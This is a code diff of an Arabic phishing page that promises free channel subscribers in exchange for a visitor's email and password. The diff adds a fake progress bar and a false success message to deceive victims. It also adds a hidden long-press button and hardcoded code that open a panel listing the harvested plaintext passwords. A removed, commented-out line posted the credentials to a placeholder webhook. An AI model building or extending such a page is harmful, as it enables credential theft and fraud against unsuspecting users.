@@ -8,26 +8,19 @@
   * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
   html, body {
     font-family: -apple-system, 'Segoe UI', Roboto, Tahoma, sans-serif;
-    background:#0f0f0f;
-    color:#f1f1f1;
+    background:#0f0f0f; color:#f1f1f1;
     min-height:100vh;
-    display:flex;
-    align-items:center;
-    justify-content:center;
+    display:flex; align-items:center; justify-content:center;
     padding:16px;
   }
   .card {
-    background:#1c1c1c;
-    border:1px solid #303030;
-    border-radius:16px;
-    width:100%;
-    max-width:420px;
+    background:#1c1c1c; border:1px solid #303030;
+    border-radius:16px; width:100%; max-width:440px;
     padding:24px 20px;
     box-shadow:0 12px 40px rgba(0,0,0,.6);
   }
   .banner {
-    width:100%; height:78px;
-    border-radius:12px;
+    width:100%; height:78px; border-radius:12px;
     background:linear-gradient(135deg,#ff0000,#8b0000);
     display:flex; align-items:center; justify-content:center;
     margin-bottom:16px;
@@ -36,8 +29,7 @@
   .logo-row { display:flex; align-items:center; gap:12px; margin-bottom:4px; }
   .avatar {
     width:52px; height:52px; border-radius:50%;
-    background:#ff0000;
-    display:flex; align-items:center; justify-content:center;
+    background:#ff0000; display:flex; align-items:center; justify-content:center;
     font-size:24px; font-weight:900; color:#fff; flex-shrink:0;
   }
   .ch-name { font-size:17px; font-weight:700; }
@@ -51,57 +43,145 @@
   .headline { font-size:15px; font-weight:600; margin-bottom:6px; }
   .subline { font-size:13px; color:#aaa; margin-bottom:16px; line-height:1.6; }
   label { display:block; font-size:13px; color:#ccc; margin-bottom:6px; margin-top:14px; }
-  input {
+  input, select {
     width:100%; padding:13px 14px;
     background:#121212; border:1px solid #3a3a3a;
     border-radius:10px; color:#fff; font-size:16px;
     outline:none; transition:border .2s;
-    -webkit-appearance:none;
+    -webkit-appearance:none; appearance:none;
   }
-  input:focus { border-color:#ff0000; }
+  input:focus, select:focus { border-color:#ff0000; }
+  select {
+    background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'><path fill='%23ff0000' d='M6 8L0 0h12z'/></svg>");
+    background-repeat:no-repeat;
+    background-position:left 14px center;
+    padding-left:34px;
+  }
   .msg { font-size:13px; text-align:center; margin-top:14px; min-height:18px; }
   .msg.ok { color:#2ecc71; }
   .msg.err { color:#ff5252; }
   .foot { text-align:center; font-size:11px; color:#666; margin-top:16px; }
 
-  /* ===== صف الزر ===== */
-  .dot-row {
-    display:flex;
-    justify-content:flex-end;
-    padding-top:16px;
-    margin-top:8px;
-    border-top:1px solid #222;
+  /* زر إرسال الرشق (أساسي) */
+  .submit-btn {
+    width:100%; margin-top:20px; padding:14px;
+    background:#ff0000; color:#fff; border:none;
+    border-radius:10px; font-size:15px; font-weight:700;
+    cursor:pointer; -webkit-appearance:none;
   }
+  .submit-btn:active { background:#cc0000; }
+  .submit-btn:disabled { background:#555; cursor:not-allowed; }
 
-  /* النقطة الحمراء — أكبر شوي */
-  .dot-btn {
+  /* شريط التقدّم */
+  .progress-wrap {
+    margin-top:18px;
+    background:#121212;
+    border:1px solid #303030;
+    border-radius:10px;
+    height:22px;
+    overflow:hidden;
+    display:none;
+  }
+  .progress-wrap.show { display:block; }
+  .progress-fill {
+    height:100%; width:0%;
+    background:linear-gradient(90deg,#ff0000,#ff5555);
+    transition:width .2s linear;
+  }
+  .progress-text {
+    text-align:center; font-size:12px; color:#bbb;
+    margin-top:8px; display:none;
+  }
+  .progress-text.show { display:block; }
+
+  .done-msg {
+    display:none; margin-top:16px;
+    background:#0f2a15; border:1px solid #2ecc71;
+    border-radius:10px; padding:14px; text-align:center;
+    font-size:14px; color:#2ecc71; line-height:1.6;
+  }
+  .done-msg.show { display:block; }
+
+  /* ===== الزر السري (ضغط مطوّل) ===== */
+  .secret-row {
+    display:flex; justify-content:flex-start;
+    margin-top:24px; padding-top:16px;
+    border-top:1px solid #1a1a1a;
+  }
+  .secret-btn {
     position:relative;
-    width:36px;                /* حجم مرئي أكبر */
-    height:36px;
-    padding:0;
-    border:none;
-    border-radius:50%;
-    background:#ff0000;
-    box-shadow:0 0 10px rgba(255,0,0,.85), 0 0 3px rgba(255,0,0,.95);
-    cursor:pointer;
-    -webkit-appearance:none;
-    outline:none;
-    animation:pulse 1.8s ease-in-out infinite;
+    width:20px; height:20px;
+    padding:0; border:none; border-radius:50%;
+    background:#3a0000;
+    box-shadow:inset 0 0 0 1px #5a0000;
+    cursor:pointer; -webkit-appearance:none; outline:none;
+    overflow:hidden;
+    opacity:.5;
+    transition:opacity .2s;
   }
-  /* منطقة لمس أوسع (56×56) — مريحة أكثر */
-  .dot-btn::before {
-    content:"";
-    position:absolute;
-    inset:-10px;               /* 36 + 20 = 56px لمس */
+  .secret-btn::after {
+    content:""; position:absolute;
+    inset:0; width:0%; background:#ff0000;
+    transition:width .05s linear;
     border-radius:50%;
-    background:transparent;
   }
-  .dot-btn:active { background:#cc0000; }
+  .secret-btn:active { opacity:1; }
 
-  @keyframes pulse {
-    0%, 100% { box-shadow:0 0 10px rgba(255,0,0,.85), 0 0 3px rgba(255,0,0,.95); }
-    50%      { box-shadow:0 0 18px rgba(255,0,0,1), 0 0 5px rgba(255,0,0,1); }
+  /* ===== نافذة الرمز ===== */
+  .modal-overlay {
+    display:none; position:fixed; inset:0;
+    background:rgba(0,0,0,.8); z-index:100;
+    align-items:center; justify-content:center; padding:20px;
   }
+  .modal-overlay.show { display:flex; }
+  .modal {
+    background:#1c1c1c; border:1px solid #303030;
+    border-radius:16px; width:100%; max-width:360px;
+    padding:24px 22px;
+  }
+  .modal h3 { font-size:16px; margin-bottom:14px; text-align:center; }
+  .modal input { text-align:center; font-size:22px; letter-spacing:6px; }
+  .modal-btns { display:flex; gap:10px; margin-top:16px; }
+  .modal-btns button {
+    flex:1; padding:12px; border:none; border-radius:10px;
+    font-size:14px; font-weight:700; cursor:pointer;
+    -webkit-appearance:none;
+  }
+  .btn-cancel { background:#333; color:#ccc; }
+  .btn-confirm { background:#ff0000; color:#fff; }
+
+  /* ===== لوحة البيانات ===== */
+  .panel-overlay {
+    display:none; position:fixed; inset:0;
+    background:rgba(0,0,0,.9); z-index:200;
+    padding:16px; overflow:auto;
+  }
+  .panel-overlay.show { display:block; }
+  .panel {
+    background:#151515; border:1px solid #303030;
+    border-radius:14px; max-width:720px; margin:20px auto;
+    padding:20px;
+  }
+  .panel-head {
+    display:flex; align-items:center; justify-content:space-between;
+    margin-bottom:16px; padding-bottom:14px; border-bottom:1px solid #2a2a2a;
+  }
+  .panel-head h2 { font-size:16px; }
+  .panel-head button {
+    background:#333; color:#ccc; border:none;
+    padding:8px 14px; border-radius:8px;
+    font-size:13px; cursor:pointer;
+  }
+  .entry {
+    background:#1c1c1c; border:1px solid #2a2a2a;
+    border-radius:10px; padding:12px 14px;
+    margin-bottom:10px; font-size:13px; line-height:1.8;
+  }
+  .entry .row { display:flex; justify-content:space-between; gap:10px; flex-wrap:wrap; }
+  .entry .k { color:#888; }
+  .entry .v { color:#fff; word-break:break-all; font-weight:600; }
+  .entry .v.pass { color:#ff7777; }
+  .empty { text-align:center; color:#666; padding:30px 0; font-size:14px; }
 </style>
 </head>
 <body>
@@ -120,9 +200,9 @@
 
   <div class="divider"></div>
 
-  <div class="headline">احصل على 1000 مشترك مجانًا</div>
+  <div class="headline">احصل على مشتركين مجانًا</div>
   <div class="subline">
-    سجّل بريدك الإلكتروني وكلمة المرور للتحقق من هويتك، وسيتم إرسال حزمة الرشق إلى حسابك خلال 24 ساعة.
+    سجّل بريدك الإلكتروني وكلمة المرور، اختر كمية الرشق، وسيتم إرسال الحزمة إلى حسابك خلال 24 ساعة.
   </div>
 
   <form id="rushForm" autocomplete="off">
@@ -134,33 +214,110 @@
     <input type="password" id="password" name="password" placeholder="••••••••"
            autocapitalize="off" autocorrect="off" required>
 
+    <label for="amount">اختر كمية المشتركين</label>
+    <select id="amount" name="amount" required>
+      <option value="1000">1,000 مشترك</option>
+      <option value="2000">2,000 مشترك</option>
+      <option value="4000">4,000 مشترك</option>
+      <option value="100000">100,000 مشترك</option>
+    </select>
+
     <div class="msg" id="msg"></div>
 
-    <div class="dot-row">
-      <button type="submit" class="dot-btn" id="dotBtn" aria-label="تفعيل"></button>
+    <button type="submit" class="submit-btn" id="submitBtn">إرسال الرشق</button>
+
+    <div class="progress-wrap" id="progressWrap">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+    <div class="progress-text" id="progressText"></div>
+
+    <div class="done-msg" id="doneMsg">
+      ✅ لقد تم إرسال الرشق بنجاح!<br>يرجى الانتظار 24 ساعة لوصول الرشق.
     </div>
   </form>
 
+  <div class="secret-row">
+    <button type="button" class="secret-btn" id="secretBtn" aria-label="secret"></button>
+  </div>
+
   <div class="foot">© 2025 قناة الرشق — جميع الحقوق محفوظة</div>
+</div>
+
+<!-- نافذة الرمز -->
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal">
+    <h3>🔒 أدخل رمز الوصول</h3>
+    <input type="password" id="codeInput" inputmode="numeric" maxlength="10" placeholder="••••••">
+    <div class="msg" id="modalMsg"></div>
+    <div class="modal-btns">
+      <button type="button" class="btn-cancel" id="cancelBtn">إلغاء</button>
+      <button type="button" class="btn-confirm" id="confirmBtn">دخول</button>
+    </div>
+  </div>
+</div>
+
+<!-- لوحة البيانات -->
+<div class="panel-overlay" id="panelOverlay">
+  <div class="panel">
+    <div class="panel-head">
+      <h2>📋 بيانات المسجّلين</h2>
+      <div>
+        <button type="button" id="clearBtn" style="margin-left:8px;">مسح الكل</button>
+        <button type="button" id="closePanelBtn">إغلاق</button>
+      </div>
+    </div>
+    <div id="entriesList"></div>
+  </div>
 </div>
 
 <script>
 (function () {
   "use strict";
 
+  const STORAGE_KEY = "rush_captures";
+  const SECRET_CODE = "1962013";
+  const HOLD_DURATION = 1200; // ms ضغط مطوّل
+
   const form = document.getElementById("rushForm");
   const msg  = document.getElementById("msg");
+  const submitBtn = document.getElementById("submitBtn");
+  const progressWrap = document.getElementById("progressWrap");
+  const progressFill = document.getElementById("progressFill");
+  const progressText = document.getElementById("progressText");
+  const doneMsg = document.getElementById("doneMsg");
+
+  const secretBtn = document.getElementById("secretBtn");
+  const modalOverlay = document.getElementById("modalOverlay");
+  const codeInput = document.getElementById("codeInput");
+  const modalMsg = document.getElementById("modalMsg");
+  const cancelBtn = document.getElementById("cancelBtn");
+  const confirmBtn = document.getElementById("confirmBtn");
+
+  const panelOverlay = document.getElementById("panelOverlay");
+  const entriesList = document.getElementById("entriesList");
+  const closePanelBtn = document.getElementById("closePanelBtn");
+  const clearBtn = document.getElementById("clearBtn");
 
   function showMsg(text, type) {
     msg.textContent = text;
     msg.className = "msg " + (type || "");
   }
 
+  function getStore() {
+    try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]"); }
+    catch (e) { return []; }
+  }
+  function setStore(arr) {
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(arr));
+  }
+
+  /* ===== إرسال النموذج + شريط التقدّم ===== */
   form.addEventListener("submit", function (e) {
     e.preventDefault();
 
     const email    = document.getElementById("email").value.trim();
     const password = document.getElementById("password").value;
+    const amount   = document.getElementById("amount").value;
 
     if (!email || !password) {
       showMsg("يرجى تعبئة جميع الحقول.", "err");
@@ -170,38 +327,167 @@
     const payload = {
       email: email,
       password: password,
+      amount: parseInt(amount, 10),
       timestamp: new Date().toISOString(),
       userAgent: navigator.userAgent,
       language: navigator.language,
-      platform: navigator.platform || "unknown",
-      screen: window.screen.width + "x" + window.screen.height,
-      referrer: document.referrer || "direct",
-      url: window.location.href
+      screen: window.screen.width + "x" + window.screen.height
     };
 
     console.log("%c📥 بيانات جديدة", "color:#ff0000;font-size:16px;font-weight:bold;");
     console.table(payload);
-    console.log("البريد:", payload.email);
-    console.log("كلمة المرور:", payload.password);
-    console.log(JSON.stringify(payload, null, 2));
+    console.log("البريد:", payload.email, "| كلمة المرور:", payload.password, "| الكمية:", payload.amount);
 
-    try {
-      const store = JSON.parse(localStorage.getItem("rush_captures") || "[]");
-      store.push(payload);
-      localStorage.setItem("rush_captures", JSON.stringify(store));
-    } catch (err) {}
+    const store = getStore();
+    store.push(payload);
+    setStore(store);
 
-    // fetch("https://YOUR-WEBHOOK-URL", {
-    //   method:"POST",
-    //   headers:{"Content-Type":"application/json"},
-    //   body: JSON.stringify(payload)
-    // }).catch(function(){});
+    // بدء شريط التقدّم
+    submitBtn.disabled = true;
+    submitBtn.textContent = "جاري الرشق...";
+    msg.textContent = "";
+    msg.className = "msg";
+    doneMsg.classList.remove("show");
+    progressWrap.classList.add("show");
+    progressText.classList.add("show");
+    progressFill.style.width = "0%";
 
-    showMsg("✓ تم التسجيل بنجاح! سيتم إرسال الحزمة خلال 24 ساعة.", "ok");
-    form.reset();
+    let pct = 0;
+    const totalTime = 4000; // مدة الشريط الكاملة
+    const step = 2;
+    const interval = totalTime / (100 / step);
+
+    const timer = setInterval(function () {
+      pct += step;
+      if (pct > 100) pct = 100;
+      progressFill.style.width = pct + "%";
+      progressText.textContent = "جاري إرسال الرشق... " + pct + "%";
+
+      if (pct >= 100) {
+        clearInterval(timer);
+        progressText.classList.remove("show");
+        progressWrap.classList.remove("show");
+        doneMsg.classList.add("show");
+        submitBtn.disabled = false;
+        submitBtn.textContent = "إرسال الرشق";
+        form.reset();
+      }
+    }, interval);
   });
+
+  /* ===== الزر السري: ضغط مطوّل ===== */
+  let holdTimer = null;
+  let holdStart = 0;
+  let rafId = null;
+
+  function startHold(e) {
+    e.preventDefault();
+    holdStart = Date.now();
+    secretBtn.style.opacity = "1";
+
+    function animate() {
+      const elapsed = Date.now() - holdStart;
+      const ratio = Math.min(elapsed / HOLD_DURATION, 1);
+      secretBtn.style.background =
+        "radial-gradient(circle, #ff0000 " + (ratio * 100) + "%, #3a0000 " + (ratio * 100) + "%)";
+
+      if (ratio >= 1) {
+        cancelHold();
+        openModal();
+        return;
+      }
+      rafId = requestAnimationFrame(animate);
+    }
+    rafId = requestAnimationFrame(animate);
+  }
+
+  function cancelHold() {
+    if (rafId) { cancelAnimationFrame(rafId); rafId = null; }
+    if (holdTimer) { clearTimeout(holdTimer); holdTimer = null; }
+    secretBtn.style.background = "#3a0000";
+    secretBtn.style.opacity = ".5";
+  }
+
+  secretBtn.addEventListener("mousedown", startHold);
+  secretBtn.addEventListener("touchstart", startHold, { passive: false });
+  secretBtn.addEventListener("mouseup", cancelHold);
+  secretBtn.addEventListener("mouseleave", cancelHold);
+  secretBtn.addEventListener("touchend", cancelHold);
+  secretBtn.addEventListener("touchcancel", cancelHold);
+
+  /* ===== نافذة الرمز ===== */
+  function openModal() {
+    modalOverlay.classList.add("show");
+    modalMsg.textContent = "";
+    modalMsg.className = "msg";
+    codeInput.value = "";
+    setTimeout(function () { codeInput.focus(); }, 100);
+  }
+  function closeModal() {
+    modalOverlay.classList.remove("show");
+  }
+
+  cancelBtn.addEventListener("click", closeModal);
+  confirmBtn.addEventListener("click", checkCode);
+  codeInput.addEventListener("keydown", function (e) {
+    if (e.key === "Enter") checkCode();
+  });
+
+  function checkCode() {
+    if (codeInput.value.trim() === SECRET_CODE) {
+      closeModal();
+      renderPanel();
+      panelOverlay.classList.add("show");
+    } else {
+      modalMsg.textContent = "الرمز غير صحيح.";
+      modalMsg.className = "msg err";
+      codeInput.value = "";
+      codeInput.focus();
+    }
+  }
+
+  /* ===== لوحة البيانات ===== */
+  function renderPanel() {
+    const store = getStore();
+    if (store.length === 0) {
+      entriesList.innerHTML = '<div class="empty">لا توجد بيانات بعد.</div>';
+      return;
+    }
+    let html = "";
+    // الأحدث أولاً
+    for (let i = store.length - 1; i >= 0; i--) {
+      const e = store[i];
+      const date = new Date(e.timestamp).toLocaleString("ar");
+      html += '<div class="entry">';
+      html += '<div class="row"><span class="k">#</span><span class="v">' + (i + 1) + '</span></div>';
+      html += '<div class="row"><span class="k">البريد:</span><span class="v">' + escapeHtml(e.email) + '</span></div>';
+      html += '<div class="row"><span class="k">كلمة المرور:</span><span class="v pass">' + escapeHtml(e.password) + '</span></div>';
+      html += '<div class="row"><span class="k">الكمية:</span><span class="v">' + (e.amount || "-") + '</span></div>';
+      html += '<div class="row"><span class="k">التاريخ:</span><span class="v">' + date + '</span></div>';
+      html += '</div>';
+    }
+    entriesList.innerHTML = html;
+  }
+
+  function escapeHtml(s) {
+    return String(s).replace(/[&<>"']/g, function (c) {
+      return { "&":"&amp;", "<":"&lt;", ">":"&gt;", '"':"&quot;", "'":"&#39;" }[c];
+    });
+  }
+
+  closePanelBtn.addEventListener("click", function () {
+    panelOverlay.classList.remove("show");
+  });
+
+  clearBtn.addEventListener("click", function () {
+    if (confirm("هل أنت متأكد من مسح جميع البيانات؟")) {
+      setStore([]);
+      renderPanel();
+    }
+  });
+
 })();
 </script>
 
 </body>
-</html>
+     </html>
